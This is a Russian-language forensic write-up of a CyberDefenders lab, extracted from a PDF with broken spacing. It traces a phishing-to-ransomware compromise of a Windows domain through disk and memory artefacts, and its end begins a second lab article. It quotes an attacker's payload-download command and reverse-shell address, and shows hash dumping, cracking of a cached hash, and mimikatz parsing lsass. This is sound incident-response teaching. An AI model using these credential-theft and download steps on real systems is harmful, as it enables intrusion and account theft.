придет ся повторить весь процесс самостоятель но — так ты лучше поймешь
и зак репишь материал.


ÈÍÑÒÐÓÌÅÍÒÛ

 1. Утилиты Eric Zimmerman : Registry Explorer, MFTECmd.
 2. Утилиты   Nirsoft :   fulleventlogview,   winprefetchview,   browsinghistoryview,
   TurnOnTimesView.
 3. R-Studio — утилита для восстановления дан ных с диска.
 4. Volatility Framework 2.6.1 — инстру мент, реализован ный на Python вер-
   сии 2 и пред назначен ный для извлечения артефак тов из образов энер-
   гозависимой памяти.
 5. PST-Extractor — инстру мент для восстановления PST-кон тейнеров в EML.
 6. Scdbg — прог рамма для анализа shell-кода.
  7. Srum-dump —  утилита для извлечения информации из базы дан ных
   управления исполь зованием системных ресурсов.
 8. FTK Imager — инстру мент для анализа и получения образов диска.
 9. WinDbg x64 — утилиты для анализа аварийных дам пов.
10. Olevba — инстру мент для извлечения и анализа исходного кода мак росов
   VBA из докумен тов MS Oﬃce (OLE и OpenXML).


ÏËÀÃÈÍÛ VOLATILITY2 ÄËß ÈÇÂËÅ×ÅÍÈß ÄÀÍÍÛÕ

 1. Imageinfo — плагин для определения операционной системы, пакета
   обновлений и аппарат ной архитек туры исследуемого образа.
 2. Pstree позволяет просматривать список процессов в виде дерева.
 3. Memdump извлекает все резиден тные страницы памяти в процессе.
 4. Filescan — плагин для поиска объектов FILE_OBJECT в памяти с помощью
   сканирования тегов пула. Этот плагин найдет все откры тые файлы.
 5. Dumpfiles извлекает кеширован ные файлы из образа памяти.
 6. Netscan ищет сетевые артефак ты в 32- и 64-разрядных дам пах памяти.
   Этот плагин находит конечные точки TCP, UDP, а так же локаль ные и удален -
   ные IP-адреса.
  7. Printkey ищет значения в указан ном разделе реестра Windows.
 8. Userassist  позволяет   получить  информацию  из  ключа  реестра
   UserAssist .
 9. Mftparser — этот плагин сканиру ет записи главной таблицы файлов (MFT)
   в памяти и выводит информацию о времен ных мет ках файлов.
10. Autoruns — под ключаемый плагин для поиска точек сохранения исполня-
   емых файлов в системе. Для его под ключения необходимо добавить плагин
   в каталог plugins инстру мен та Volatility.
11. Volshell — плагин для интерак тивного изу чения образа памяти, исполь зует
    IPython.
12. Procdump — плагин для получения дам па исполняемого файла.
13. Hivelist — плагин для поиска виртуаль ных адресов кустов реестра.


ÎÁÚÅÊÒÛ ÄÎÌÅÍÀ

В архиве задания содержится файл 20211122102526.zip, который хранит
информацию об объектах домена. Заг рузим его в BloodHound версии 4.0.1.
   Перейдем на вклад ку Analysyis → Find Shotest Paths to Domain Admins и про-
анализируем корот кий путь до ком прометации кон троллера домена.





               Корот кий путь до администратора домена

Задача злоумыш ленника в сети организации — получить доступ к учет ной
записи поль зователя 0xMohammed, который входит в группу Domain Admins.


ÎÁÐÀÇ ÄÈÑÊÀ AD.E01

Примон тиру ем файл побитовой копии диска AD.E01 и извлечем из него необ-
ходимые  артефак ты. Для  этого откроем  утилиту FTK  Imager, перейдем
на вклад ку File → Image Mounting. В поле Image File выберем образ AD.E01,
а затем введем указан ные ниже настройки.





                  Мон тирование образа диска

Нажимаем Mount — исследуемый образ должен примон тировать ся к файловой
системе.
   Получим информацию из кустов реестра SYSTEM и SOFTWARE (C:\Windows\
System32\config), заг рузим их в утилиту Registry Explorer. Затем переходим
в раздел File → Load hive и выбираем исследуемый файл.
   Чтобы получить информацию об операционной системе, перейдем в ключ
реестра SOFTWARE\Microsoft\Windows NT\CurrentVersion.





               Ин формация об операционной системе

Версия операционной системы — Windows 10 Enterprise 2016 LTSB. Теперь
просмотрим ключ реестра SYSTEM\ControlSet01\Control\ComputerName\
ComputerName и получим информацию об имени компь ютера.





                      Имя компь ютера

Имя компь ютера: PC01.
   Теперь откроем ключ реестра SYSTEM\ControlSet001\Services\Tcpip\

Parameters\Interfaces\{ea202436-8a31-4cb6-9b59-5be0c2bc1692}
и получим информацию о сетевых настройках.





                 Ин формация о сетевых настройках

IP-адрес исследуемого хоста — 192.168.112.142.
   Получим информацию о примон тирован ных дисках. Для этого перейдем
в вет ку реестра SYSTEM\MountedDevices: нас интересу ет GUID диска C.





                          GUID диска С

Из значения на рисун ке выше следует, что GUID диска C — fad905b3-fb35-
4dbd-ab31-a44f022809d2, такую же информацию можно получить из логов
системы, просмотрев событие eventid  142 журнала Microsoft-Windows-
Ntfs/Operational.
   Теперь найдем порты служб на PC01, для этого перейдем  к файлу
Windows/System32/drivers/etc/services.


                  Содержимое файла services

Здесь мы можем увидеть, что служба Remote Man Server работает на порте
9535. Проанализируем файл System.evtx и найдем отметку времени, ког да
произош ло незапланирован ное отключение, а так же узнаем, сколь ко времени
проработал  компь ютер.  Для  этого  можно  восполь зовать ся  утилитой
TurnOnTimesView, либо придет ся анализировать лог вручную.



               Резуль тат работы утилиты TurnOnTimesView

21.11.2021 питание машины незапланирован но отключилось, до этого компь -
ютер проработал 11 часов и 31 минуту (об этом говорит значение 11:31).
   Начнем анализировать логи. Для этого откроем утилиту fulleventlogview,
нажмем Choose Data Store → Load events from external folder with log les и ука-
жем путь к папке с логами Windows\System32\winevt\Logs.
   От филь тру ем логи по событию 4624 и посмотрим, кто авторизовывался
в системе последний раз перед инциден том. Для этого переходим на вклад ку
Options → Advanced Options, выбираем Show only the specied events IDs и вво-
дим наше событие.
   23.11.2021 в 23:36:05 UTC поль зователь 0xMohammed авторизовался в сис-
теме — это был последний зарегистрирован ный логин перед взломом.





           Последний авторизован ный поль зователь в системе

Проанализируем историю браузера Firefox поль зователя labib. Для этого вос-
поль зуем ся утилитой BrowsingHistoryView: перейдем на вклад ку Options →
Advanced Options и укажем путь до поль зователь ского каталога.





               Получение истории из браузера Firefox





                        История Firefox

Поль зователь labib 22.11.2021 в 19:45:52 UTC посетил сайт bluedemy.
cyberdefenders.org.
   Проанализируем  базу  дан ных  управления  исполь зованием  системных
ресурсов  (srum), которая присутству ет в современ ных системах Windows
и собирает статистику выполнения двоичных файлов. Эта база хранит ся в фай-
ле C:\Windows\System32\sru\\RUDB.dat. С исполь зованием утилиты srum-
dump проанализируем srum и найдем, сколь ко байтов было принято браузе-
ром Firefox.





                      Работа утилиты srum-dump

Не забываем так же указать файл SRUM_TEMPLATE.xlsx, который заг ружаем
из репозитория утилиты.
   От кры ваем выход ной файл SRUM_DUMP_OUTPUT.xlsx, переходим на лист
Network Data Usage, находим firefox.exe и анализируем таблицу. Количество
получен ных дан ных — 20418287.
   Теперь посмотрим, какие последние файлы запускал поль зователь labib.
Переходим по пути С/Users/labib/AppData/Roaming/Microsoft/Windows/
Recent/ и в этом каталоге находим файл 20211119103954_BloodHound.lnk,
созданный 19.11.2021.
  В ссылке на файл  указан  путь  к  архиву  C:\Users\labib\Desktop\
20211119103954_BloodHound.zip, содержащий информацию об объектах
домена. Эта информация собиралась для анализа в BloodHound.
   Проанализируем MFT с помощью утилиты MFTECmd. Из корня файловой
системы извлечем файл $MFT, это можно сделать с помощью R-Studio
или FTKImager.
  В каталоге Users/labib/Desktop создан файл Business.xlsx с мет кой
времени 22.11.2021 22:40:06, этот файл содержит информацию о поль зовате-
лях домена и их деятель ности в ком пании. Найдем указан ный файл в таблице
MFT:


MFTECmd.exe -f "C:\Users\DonNod\Downloads\AD-101\AD-E01\MFT" --
csv "AD-101\AD-E01"

В файле вывода утилиты MFTECmd обнаруживаем Business.xlsx и его поле
LogfileSequenceNumber, которое имеет значение 1422361276.
   Попробу ем получить пароль поль зователя 0xMohammed, который входит
в группу администраторов домена. Выг рузим вет ки реестра SAM, SYSTEM,
SECURITY и вытащим из них хеши поль зователей. Для этого восполь зуем ся
скриптом secretdum.py из пакета Impacket.





        Выг ружен ные аутен тификацион ные дан ные из веток реестра

На хосте PC01 авторизовывался домен ный поль зователь 0xMohammed, его дан -
ные сохранены в кеше. С помощью утилиты hashcat сбру тим mccache2 хеша
поль зователя 0xMohammed:


$DCC2$10240#0xMohammed#e7b8d19008520207ca8ef94680db0f28

В резуль тате этой операции выясняет ся, что его пароль — 0xmohammed!.
   Теперь попытаемся узнать, как злоумыш ленник ском прометировал хост
PC01. Анализируя файлы, в каталоге C:\Users\labib\Documents\Outlook
Files\Outlook.pst поль зователя labib мы обнаруживаем почтовый кон тей-
нер Outlook. Преобразуем кон тейнер в eml-сообщения, для этого откроем ути-
литу PST-Xtracrot, заг рузим в нее кон тейнер и нажмем Convert. После этого
можно проанализировать все сообщения антивирусными средствами, чтобы
поискать вредоносные вложения.





                     Содержимое пись ма





                  Заголовок вредоносного пись ма

Среди сообщений поль зователя мы обнаруживаем вредоносное вложение.
Сообщение отправлено 12/08/2021 04:47:49 AM UTC с почтового сервера
159.65.58.195. В качестве вложения исполь зует ся файл Unpaid Invoice.
xls. Выясним, ког да поль зователь открыл этот файл.
  С помощью утилиты winprefetchview исследуем артефакт Prefetch. Для этого
нажмем Options → Advanced Options и выберем расположение файлов prefetch
ском прометирован ного компь ютера:  \Windows\Prefetch. Файлы  Prefetch
содержат имя исполняемого файла, количество его запусков, мет ки времени,
а так же список файлов и каталогов, с которы ми взаимодействовал исполня-
емый файл.





                   Запуск файла Unpaid Invoice.xls

Поле Last Run содержит дату последних семи запусков. Как вид но из рисун ка
выше, поль зователь открыл файл Unpaid Invoice.xls, при этом последняя
мет ка времени запуска приложения Excel.exe — 22.11.2021 в 19:38:16
UTC. Осталось выяснить, что пред ставляет собой вредоносный файл Unpaid
Invoice.xls, по его MD5: 650cf937046ce0c755a217ae8a60611d.
   Файл содержит VBA-скрипт. Вытащим его с помощью olevba. При запуске
появляют ся ошибки, поэтому мы запустим утилиту с парамет ром --show-
pcode.  Техника  встраивания  вредоносного  кода  в  содержащий мак рос
документ называется Stomping VBA.


olevba --show-pcode Unpaid\ Invoice.xls




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                          ИССЛЕДУЕМ ДАМПЫ
                      И ИЩЕМ СЛЕДЫ ВЗЛОМА
                                 В СИСТЕМЕ





                   Резуль тат работы утилиты olevba

Извлечем p-code, найдем шелл и проанализируем его.





                       Часть вредоносного p-code

Преобразуем его в следующий формат и сохраним в файл sc.


                   Содержимое шелл-кода

Проанализируем получен ный файл с помощью утилиты scdbg.


scdbg /f sc





                           Шелл-код

После запуска докумен та Unpaid Invoice.xls устанавливается обратная обо-
лочка с управляющим сервером 192.168.112.128:8080, после чего злоумыш -
ленник может выполнять коман ды на ском прометирован ном компь ютере.
   Приступим  к анализу логов операционной системы и выясним, какие
еще  действия  совершил  злоумыш ленник  в  системе.  Откроем  утилиту
fulleventlogview, перейдем на вклад ку File → Choose Data Source и укажем путь
к файлам логов: Windows\System32\winevt\Logs.
  Проанализируем сначала логи антивиру са Windows Defender. Мы сразу же
обнаруживаем       событие       c       иден тификатором       1116
(MALWAREPROTECTION_STATE_MALWARE_DETECTED),  которое  свидетель -
ству ет об обнаружении вредоносного файла.





                     Логи Windows Defender

Поль зователь 0xMohammed пытался открыть файл по пути \\vmware-host\
Shared Folders\asd\note.txt в блок ноте. Windows Defender обнаружил вре-
доносный файл и классифицировал его как Exploit:Win32/ShellCode.BN
(каталог расположения файла asd).
  Пред положитель но запуск вредоносного докумен та Unpaid Invoice.xls
произошел 22.11.2021 в 19:38 UTC, с этого момен та мы и начнем анализи-
ровать логи. В 20:26:03 UTC была запущена оболочка Windows PowerShell
(события имеют иден тификаторы 400 и 600), далее начинается выполнение
коман ды.





                Вы зов PowerShell с аргу мен том -h





               Вы полнение вредоносного скрипта

После выполнения обратной оболочки в файле Unpaid  Invoice.xls зло-
умыш ленник получил доступ к компь ютеру, затем он начал выполнять коман ды
PowerShell, показан ные на рисун ке выше. Извлечем их из логов и преобразуем
в тек стовый вид.





            PowerShell коман ды, выполненные злоумыш ленником

Злоумыш ленник запустил новую оболочку PowerShell от имени поль зователя
labib для устойчивого доступа к ском прометирован ному компь ютеру с IP-
адресом 192.168.112.128, на порте 1337. Далее взлом щик пытался авторизо-
вать ся  на  хосте  DC01  c  учет ными  дан ными  поль зователя  labib.
В 21:20:29 зафик сировано событие 4648 — авторизация на компь ютере
DC01 от поль зователя labib, имя процесса PowerShell.exe.





                       Событие 4648

В 21:20:46 так же зафик сированы попыт ки входа на PC01 с адреса 192.168.
112.128, авторизовать ся пытался тот же поль зователь labib.





                       Сетевой вход

В 21:51:15 UTC от имени поль зователя labib выполнен скрипт  Invoke-
ACLPwn.ps1 . Этот скрипт пред назначен для удаления списков ACL в Active
Directory, настроенных небезопасно, а так же для сбора дан ных об объектах
домена.





             Вы полнение скрипта Invoke-ACLPwn.ps1

Для получения доступа к компь ютеру DC01 злоумыш леннику необходимо зав-
ладеть учет ной записью поль зователя 0xMohammed, который входит в группу
Domain Admins. В 22:56:23 UTC обнаружено под ключение к DC01 c помощью
службы WinRM, иден тификатор события 6.





                       От кры тие WinRM

В 22:58:44 UTC зафик сировано событие авторизации на хосте DC01, при этом
были введены учет ные дан ные поль зователя 0xMohammed.





                    Попыт ка входа в систему

С этого момен та злоумыш ленник выполнял коман ды PowerShell уже от имени
поль зователя 0xMohammed. В 13:32:44 UTC 23.11.2021 домен ный поль зователь
CYBERDEFENDERS\0xMohammed зарегистрировал задачу MicrosoftEdge, иден -
тификатор события 106. Найдем эту задачу в каталоге Windows\System32\
Tasks\MicrosoftEdge.





                  Созданная задача MicrosoftEdge

Сог ласно  мат рице  MITRE  ATT&CK,  такая  техника  атаки  называется
T1053.005 ,    атакующий   исполь зовал   управляющий   сервер   c2.
cyberdefenders.org.
   Теперь  проверим  историю  команд   PowerShell.  Для  поль зователя
administrator   в  файле   C:/Users/administrator/AppData/Roaming/

Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
хранит ся следующая информация.


   Содержимое файла ConsoleHost_history.txt поль зователя administrator

При исследовании артефак тов, извлечен ных из побитовой копии образа хоста
PC01, удалось восстановить ход взлома. С помощью фишин гового пись ма,
содержащего шелл-код с адресом управляющего сервера 192.168.112.128:
8080, злоумыш ленники получили доступ к компь ютеру от имени поль зователя
labib. Затем они собрали информацию о домене и ском прометировали учет -
ные дан ные администратора домена 0xMohammed. Для доступа  к  хосту
DC01 атакующие исполь зовали службу WinRM и удален ное выполнение команд
PowerShell.


ÎÁÐÀÇ ÎÏÅÐÀÒÈÂÍÎÉ ÏÀÌßÒÈ ÕÎÑÒÀ DC01

При исследовании образа оперативной памяти мы научим ся выявлять арте-
фак ты удален ного выполнения кода службы WinRM, познакомим ся с важными
струк турами исполняемых объектов памяти Windows, узнаем, как их анализи-
ровать, и выясним, что сделал злоумыш ленник на ском прометирован ном
компь ютере.
   Для начала получим информацию об исследуемом профиле и имени компь -
ютера.


python2.7 vol.py -f memory.dmp imageinfo

Профиль образа — Win2016x64_14393. Теперь получим информацию из ключа
реестра SYSTEM\ControlSet001\Control\ComputerName\ComputerName.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393
printkey -K "SYSTEM\ControlSet001\Control\ComputerName\C
omputerName"





                      Имя компь ютера

Получим адрес вет ки реестра SOFTWARE:


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393 hivelist

Ад рес вет ки SOFTWARE — 0x00000000040f7000.
  Можно приступать к анализу процессов. Для этого восполь зуем ся плагином
pstree, а резуль тат выполнения сохраним в файл.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393 pstree >
 pstree.txt





                 Запущен ные в системе процессы

Из рисун ка выше вид но, что процесс svchost.exe (иден тификатор 512)
породил  экзем пляр  процесса  wsmprovhost.exe  (иден тификатор  1632),
который является хост-процессом для под ключаемых модулей службы WinRM.
Коман ды PowerShell злоумыш ленника удален но выполнялись в кон тек сте про-
цесса wsmprovhost.exe (иден тификатор 1632). Так же процесс 1632 создал
дочерний процесс svchost.exe. Из получен ного анализа можно сделать
вывод, что злоумыш ленники получили доступ к компь ютеру DC01, исполь зуя
возможности службы WinRM.




                      Ка чес твенный ана лиз поис ка уда ленного выпол -
                       нения  команд  PowerShell  опи сан  в  статье
                           Investigating PowerShell Attacks.


Службы WinRM для взаимодействия исполь зуют протокол WS-Management ,
который отправляет сообщения SOAP в потоке XML-сообщений. Их струк тура
пред ставлена в докумен тации. Получим все резиден тные страницы памяти
процесса wsmprovhost.exe (иден тификатор 1632) и извлечем из него все
XML-объекты, в которых передаются коман ды PowerShell службы WinRM.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393 memdump
-p 1632 -D .

Все найден ные XML-объекты сохраним в файл. Затем в струк туре XML-
докумен та найдем поле <S N="History">:


strings 1632.dmp | grep -i '<Obj RefId="0">' > objectPS



                       Заг рузка файла svchost.exe

Для  заг рузки  файла  svchost.exe  исполь зует ся  следующая  коман да
PowerShell:  Invoke-WebRequest  http://192.168.112.128:8000/svchost.
exe -OutFile svchost.exe. Спускаем ся ниже и видим запуск дан ного файла.


                      Запуск файла svchost

Иног да сложно найти вредоносный процесс в памяти Windows, в этом слу чае
можно получить дам пы всех процессов в системе и проверить их с помощью
антивиру са.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393
procdump -D procdmp/




               Обнаружен ный вредоносный файл

Процесс  svchost.exe  (иден тификатор  3140)  вредоносный  и  относит ся
к семейству шифроваль щиков DarkSide. Получим информацию о привилегиях
этого процесса в системе, для чего восполь зуем ся плагином privs.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393 privs -p
 3140





                  Привилегии процесса svchost.exe

Количество привилегий по умолчанию у этого вредоносного процесса — 25.
Давай проведем глу бокий анализ вредоносного процесса 3140, но прежде
нем ного поговорим о струк турах исполняемых объектов в памяти.
  Найдем поле PoolTag струк туры _POOL_HEADER исследуемого процесса.
В памяти Windows есть следующие криминалистически важные исполняемые
объекты: _FILE_OBJECT — экзем пляр откры того файла, пред ставляющий дос-
туп процессу или модулю ядра к файлу, _EPROCESS — струк тура процесса
в памяти, _TOKEN, _ETHREAD и многое дру гое.




                     Опи сание структуры памяти Windows пред став-
                       лено  в  кни ге  The  Art  of  Memory  Forensics:
                         Detecting Malware and Threats in Windows, Linux,
                      and Mac Memory.


Каждый исполняемый объект Windows хранит ся в следующей струк туре.





                      Пул исполняемого объекта

Пул ядра — это диапазон памяти, который можно разделить на мелкие блоки
для хранения дан ных любого типа.





                       Струк тура _POOL_HEADER

Струк тура _POOL_HEADER содержит элемент PoolTag — состоящее из ASCII-
сим волов  четырехбайтовое  значение.  Этот  элемент  создан  Microsoft
для отладки и аудита ядра. Элемент PoolTag может иметь значения Proc,
Thrd, File и дру гие. Многие плагины Volatility для поиска объектов в памяти
исполь зуют метод сканирования PoolTag, чтобы находить скры тые и завер-
шенные процессы, а так же рут киты. Размер струк туры _POLL_HEADER составля-
ет 10 байт.
   Струк тура _OBJECT_HEADER общая для всех типов исполняемых объектов.
Размер Optional Header в струк туре пула исполняемого объекта определя-
ется в зависимости от содержимого поля InfoMask.





                      Струк тура _OBJECT_HEADER





                  Значение InfoMask и его размер




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                          ИССЛЕДУЕМ ДАМПЫ
                      И ИЩЕМ СЛЕДЫ ВЗЛОМА
                                 В СИСТЕМЕ




Наша  задача —  найти  содержимое  элемен та  PoolTag  в  струк туре
_POOL_HEADER вредоносного процесса svchost.exe (иден тификатор 3140).
Для этого необходимо перейти к адресу струк туры _EPROCESS, далее в струк -
туре _OBJECT_HEADER найти элемент InfoMask, чтобы определить размер
Optional Header, и перейти на адрес струк туры _POOL_HEADER. Для этого
восполь зуем ся плагином volshell.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393
volshell -p 3140

Далее получим адрес струк туры _EPROCESS.


proc()

Ад рес исследуемого процесса — 0xFFFFBA03419B7800.
   Теперь  получим  содержимое  струк туры  _OBJECT_HEADER.  Для  этого
из адреса 0xFFFFBA03419B7800 вычтем 0x30 (размер _OBJECT_HEADER).


dt("_OBJECT_HEADER",0xFFFFBA03419B7800-0x30)





             Содержимое струк туры _OBJECT_HEADER

Значение поля InfoMask — 0x8, а значит, по таблице выше размер Optional
Header составляет 0x20 байт.
   Чтобы перейти на адрес струк туры _POOL_HEADER вредоносного процесса
svchost.exe, необходимо из адреса 0xFFFFBA03419B7800 вычесть 0x30 (раз-
мер _OBJECT_HEADER), 0x20 (размер Optional  Header) и 0x10 (размер
_POOL_HEADER).


dt("_POOL_HEADER",0xFFFFBA03419B7800-0x30-0x10-0x20)





        Содержимое струк туры _POOL_HEADER процесса 3140

Переводим   значение  PoolTag   в  шестнад цатеричное  пред ставление
в обратном поряд ке пред ставления байтов и получаем значение в кодировке
ASCII MHML (0x4d 0x48 0x4d 0x4c).
  Продолжим анализировать этот процесс с помощью плагина volshell и най-
дем содержимое  кучи,  в которой  хранят ся обрабаты ваемые процессом
динамические дан ные. Каждая струк тура _EPROCESS содержит элемент Process
Environment Block (PEB). PEB хранит полный путь к исполняемому файлу про-
цесса, коман дную строку,  которая  запускает процесс, текущий рабочий
каталог, а так же указатели на кучи процесса.





                 Содержимое процесса в памяти

Струк тура PEB присутству ет в каждом процессе, который содержит в себе
кучу. Наша задача — найти адреса дан ных, хранящихся в куче. Это и будет
спрятан ное 8-байтовое слово в памяти процесса. Нужно найти строки, содер-
жащиеся в куче процесса: для этого нам необходимо получить адреса куч
и вывести их содержимое. Можно восполь зовать ся плагином heaps, но он
доволь но прост в работе, поэтому попробу ем восстановить нужные значения
вручную.


python2.7 vol.py -fmemory .dmp --profile=Win2016x64_14393 volshell
-p 3140

Получим из кучи процесса указатели на их содержимое. Вводим в строке
vollshell следующее:


address_of_heaps = proc().Peb.ProcessHeaps.dereference()

Мы получили указатели, теперь цик лом выведем их содержимое.





                 Дан ные, которые содержатся в куче

Мы обнаружили все дан ные, содержащиеся в куче. Скры тое 8-байтовое сло-
во — c0n6r475.
  Исполь зуя плагин yarascan, найдем все ссылки в памяти процесса. Для это-
го восполь зуем ся следующим регулярным выражением: /(https?:\/\/)?([\
w\.-]+)([\/\w \.-]*)/.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393
yarascan -Y "/(https?:\/\/)?([\w\.-]+)([\/\w \.-]*)/" -p 3140





            Обнаружен ные строки в памяти процесса

Анализируя ссылки процесса, мы обнаружили интересную строку с каким-то
ключом. Попробу ем определить его содержимое. Для этого получим дамп
всего адресного пространства процесса 3140:


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393 memdump
-p 3140  -D .

И найдем значения key:


strings 3140.dmp | grep  'lsJTyy' -B 50 -A 10





                    Требования злоумыш ленников

Мы  обнаружили  требование о  выкупе,  которое  оставил шифроваль щик
DarkSide. Найдем в образе памяти адрес смещения 567-байтового значения
ключа Key:, для этого восполь зуем ся плагином yarascan:


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393
yarascan -Y "lsJTyy" -p 3140





            Ад рес смещения 567-байтового ключа в памяти

Шифроваль щик  сохранил  567-байтовый  ключ  в  памяти  по смещению
0x00b5f4a5. Получим список файлов в памяти и найдем файл svchost.exe.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393
filescan > filescan.txt


                       Ад рес файла в памяти

Преобразуем адрес в физическое смещение, для этого восполь зуем ся пла-
гином volshell.


hex(addrspace().vtop(0x0000ba033f477bc0))

По физическому адресу 0x13c090bc0 в памяти хранит ся файл svchost.exe.
Просмотрим содержимое струк туры _FILE_OBJECT файла svchost.exe, вир-
туаль ный адрес которого — 0x0000ba033f477bc0. Для этого восполь зуем ся
плагином volshell.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393 volshell


dt("_FILE_OBJECT",0x0000ba033f477bc0)





                        Ад рес устройства

Преобразуем значение в элемен те DeviceObject в шестнад цатеричное пред -
ставление.


hex(18446667121827189856)

Ад рес устройства, на котором сохранен шифроваль щик svchost.exe, —
0xffffba033e631460.
  Выг рузим исследуемый файл из файловой системы, в качестве адреса ука-
жем адрес смещения.


python2.7 vol.py -f memory.dmp --profile=Win2016x64_14393
dumpfiles -Q 0x13c090bc0  -D .

Заг рузим любой из получен ных файлов в утилиту PeStudio.





                       Заголовок файла

Внут реннее имя исполняемого файла svchost.exe — calimalimodumator.
exe. Посмотрим таблицу импорта и найдем интересные фун кции WinAPI.





                      Фун кция импорта

В таблице импорта находит ся WinAPI-фун кция GetLocaleInfoA: она исполь -
зует ся для получения локали операционной системы. Проанализируем процесс
lsass.exe и найдем мастер-ключ.
  Процесс Local Security Authority Subsystem Service (он же LSASS) пред -
назначен для управления под системами аутен тификации Windows. Для хра-
нения аутен тификацион ных дан ных в памяти исполь зует ся механизм DPAPI
(Windows Data Protection API), который шифрует пароли и любую дру гую важную
информацию поль зователя. Для расшифровки дан ных, зашифрован ных через
DPAPI, необходим мастер-ключ, хеш и SID поль зователя. Попробу ем рас-
парсить процесс lsass.exe и найдем мастер-ключ поль зователя 0xMohammed.
  Исполь зуя плагин lsadump  Volatility, мне не удалось вытащить дан ную
информацию. Восполь зуем ся утилитой WinDbg x64. Заг рузим файл memdump.
dmp в WinDbg x64, для этого перейдем на вклад ку File → Open CrashDump. Все
осталь ные действия будем производить в коман дной строке отладчика.


!analyze -v

Теперь заг рузим mimikatz в WinDbg.


.load  mimikatz-master\x64\mimilib.dll

Найдем адрес струк туры _EPROCESS процесса lsass.exe.


!process 0 0 lsass.exe




                 Поиск адреса процесса lsass.exe

Переходим по адресу ffffba033ef746c0.


.process /r /p ffffba033ef746c0

Парсим lsass.exe.


!mimikatz

Находим поль зователя 0xMohammed и видим следующую информацию.





                  MasterKey поль зователя 0xMohammed

Мастер-ключ поль зователя 0xMohammed:


1652c67aa6719519492e67d1b39cab91e7804eb26b259ff351b60df34ee8088043
14cbfbcf03afbf3bae3ef2790f2c363ca0a9c8791e0e80d490c26afe77c3be


ÂÛÂÎÄÛ

Мы исследовали образ оперативной памяти, познакомились со струк турами
_EPROCESS и _FILE_OBJECT, разобрались, как происходит сканирование пула
тегов и какие дан ные там хранят ся. Обнаружили, что злоумыш ленник получил
доступ к компь ютеру DC01 с помощью службы WinRM, а так же вытащили
передан ные им коман ды PowerShell.
  Мы провели расследование стен дового инциден та и ответили на вопросы
лабораторной работы. Злоумыш ленник с адреса 192.168.112.128 ском про-
метировал хост PC01, исполь зуя фишин говое сообщение с вредоносным вло-
жением. Перехватил учет ные дан ные поль зователя labib и администратора
домена 0xMohammed. Затем с помощью службы WinRM получил доступ к хосту
DC01, тем самым ском прометировал кон троллер домена и заг рузил на него
шифроваль щик семейства DarkSide.
ВЗЛОМ





 РАССЛЕДУЕМ ЗАРАЖЕНИЕ
  МАШИНЫ С WINDOWS
  ШПИОНСКИМ ТРОЯНОМ





В этой статье я покажу, как извлекать
основные  артефак ты  из  обра зов  опе-
ратив ной памяти Windows. Мы восста -
новим про цесс ата ки, что бы расследовать
инци дент. В этом нам поможет лабора тор -            rayhunt454                                                                                    grigadan454@gmail.com
ная   работа   TeamSpy   с   ресур са
CyberDefenders .


По сценарию сот рудник ком пании сообщил, что получил подозритель ное элек -
трон ное пись мо с файлом докумен та и после этого компь ютер начал вести
себя стран но. Группа реагирования на инциден ты сделала несколь ко дам пов
памяти с подозритель ных машин. Наша задача — расследовать инцидент
и разобрать ся, что произош ло.




                    По результатам решения кей са необ ходимо отве-
                        тить на ряд вопросов, одна ко я покажу лишь сам
                       процесс  решения. Повторив прохож дение, ты
                     сможешь  сам  дать  ответы  для  закрепления
                       матери ала.


Заг рузим архив с артефак тами и приступим к их исследованию.


ÈÑÏÎËÜÇÓÅÌÛÅ ÓÒÈËÈÒÛ
 1. Volatility Framework 2.6.1 — инстру мент, реализован ный на Python 2.
   Пред назначен для извлечения артефак тов из образцов энергозависимой
   памяти.
 2. Bulk  extractor —  инстру мент  для  извлечения  струк турирован ной
   информации, к примеру адресов элек трон ной почты, URL, доменов.
 3. YARA Editor — прог рамма для тестирования и создания правил YARA.
 4. OST  Extractor — инстру мент для восстановления OST-кон тейнеров
   в EML.
 5. Scdbg — прог рамма для анализа shell-кода.


ÈÑÏÎËÜÇÓÅÌÛÅ ÄËß ÈÇÂËÅ×ÅÍÈß ÄÀÍÍÛÕ ÏËÀÃÈÍÛ
VOLATILITY 2
 1. Imageinfo — плагин для определения операционной системы, пакета
   обновлений и аппарат ной архитек туры исследуемого образа.
 2. Pstree — просмотр списка процессов в виде дерева.
 3. Handles — просмотр откры тых дескрипторов к файлам, разделам реестра,
   мьютек сам, именован ным каналам, событиям в процессах. Так же можно
   отобразить дескрипторы для кон крет ного процесса, задав филь тр по типу
   объекта.
 4. Consoles — плагин для поиска команд, которые злоумыш ленники ввели
   через cmd.exe. Основное преиму щество этого плагина в том, что он
   не толь ко печатает коман ды, введен ные злоумыш ленниками, но и собирает
   весь экранный буфер (ввод и вывод).
 5. Memdump — извлечение всех резиден тных страниц памяти в процессе.
 6. Filescan —  плагин  для  поиска  объектов FILE_OBJECT  в  памяти
   с помощью сканирования тегов пула. Этот плагин найдет все откры тые
   файлы.
  7. Dumpfiles — извлечение кеширован ных файлов из образа памяти.
 8. Netscan — поиск сетевых артефак тов в 32- и 64-разрядных дам пах
   памяти. Этот плагин находит конечные точки TCP и UDP, а так же ищет
   локаль ные и удален ные IP-адреса.
 9. Printkey — поиск значений в указан ном разделе реестра Windows.
10. Userassist — получение информации из ключа реестра UserAssist.
11. Mftparser — сканиру ет записи главной таблицы файлов (MFT) в памяти
   и выводит информацию о времен ных мет ках файлов.
12. Autoruns — под ключаемый плагин для поиска точек сохранения исполня-
   емых файлов в системе. Для под ключения плагина нужно добавить его
   в каталог plugins инстру мен та Volatility.
13. Malfind — плагин для поиска скры того или внед ренного в память процес-
   сов кода.
14. Editbox — плагин для извлечения тек ста из элемен тов управления Windows
    Edit.


ÈÑÑËÅÄÎÂÀÍÈÅ ÕÎÑÒÀ ECORPOFFICE
Прежде чем искать вирусную активность, давай получим первичную информа-
